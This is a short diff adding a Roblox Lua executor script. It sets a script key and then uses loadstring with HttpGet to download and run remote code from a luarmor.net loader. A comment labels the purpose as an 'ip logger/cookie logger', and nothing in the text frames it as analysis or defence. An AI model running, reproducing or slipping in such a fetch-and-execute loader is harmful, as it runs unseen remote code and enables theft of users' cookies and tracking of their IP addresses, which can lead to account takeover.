@@ -1,0 +1,4 @@
+-- execute for ip logger/cookie logger
+script_key="zUESdIHqftphKZQhuAGEFcAaIxETeKYr";
+getgenv().Lite = false
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b9b233e837477a00589c614254268954.lua"))()
